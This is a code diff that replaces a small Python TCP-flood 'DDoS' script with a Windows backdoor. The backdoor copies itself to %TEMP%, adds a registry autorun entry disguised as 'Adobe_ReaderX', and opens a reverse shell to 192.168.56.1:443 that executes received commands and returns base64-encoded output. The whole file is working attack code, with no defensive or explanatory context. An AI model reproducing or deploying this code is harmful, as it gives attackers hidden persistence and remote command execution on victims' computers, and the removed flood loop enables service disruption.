@@ -1,39 +1,53 @@
-import time, socket, os, sys, string
-
-def restart_program():
-    python = sys.executable
-    os.execl(python, python, * sys.argv)
-curdir = os.getcwd()
-
-print ("DDoS mode loaded")
-host="127.0.0.1"
-port=80
-message="+---------------------------+"
-conn=100
-ip = socket.gethostbyname(host)
-print ("[" + ip + "]")
-print ( "[Ip is locked]" )
-print ( "[Attacking " + host + "]" )
-print ("+----------------------------+")
-def dos():
-    #pid = os.fork()
-    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+import sys, base64, os, socket, subprocess
+from _winreg import *
+ 
+def autorun(tempdir, fileName, run):
+# Copy executable to %TEMP%:
+    os.system('copy %s %s'%(fileName, tempdir))
+ 
+# Queries Windows registry for the autorun key value
+# Stores the key values in runkey array
+    key = OpenKey(HKEY_LOCAL_MACHINE, run)
+    runkey =[]
     try:
-        ddos.connect((host, port))
-        ddos.send( message )
-        ddos.sendto( message, (ip, port) )
-        ddos.send( message );
-    except socket.error, msg:
-        print("|[Connection Failed] |")
-    print ( "|[DDoS Attack Engaged] |")
-    ddos.close()
-for i in range(1, conn):
-    dos()
-print ("+----------------------------+")
-print("The connections you requested had finished")
+        i = 0
+        while True:
+            subkey = EnumValue(key, i)
+            runkey.append(subkey[0])
+            i += 1
+    except WindowsError:
+        pass
+ 
+# If the autorun key "Adobe ReaderX" isn't set this will set the key:
+    if 'Adobe ReaderX' not in runkey:
+        try:
+            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
+            SetValueEx(key ,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
+            key.Close()
+        except WindowsError:
+            pass
+ 
+def shell():
+#Base64 encoded reverse shell
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.56.1', int(443)))
+    s.send('[*] Connection Established!')
+    while 1:
+        data = s.recv(1024)
+        if data == "quit": break
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        stdout_value = proc.stdout.read() + proc.stderr.read()
+        encoded = base64.b64encode(stdout_value)
+        s.send(encoded)
+        #s.send(stdout_value)
+    s.close()
+ 
+def main():
+    tempdir = '%TEMP%'
+    fileName = sys.argv[0]
+    run = "Software\Microsoft\Windows\CurrentVersion\Run"
+    autorun(tempdir, fileName, run)
+    shell()
+ 
 if __name__ == "__main__":
-    answer = raw_input("Do you want to ddos more?")
-    if answer.strip() in "y Y yes Yes YES".split():
-        restart_program()
-    else:
-        print "bye"
+        main()
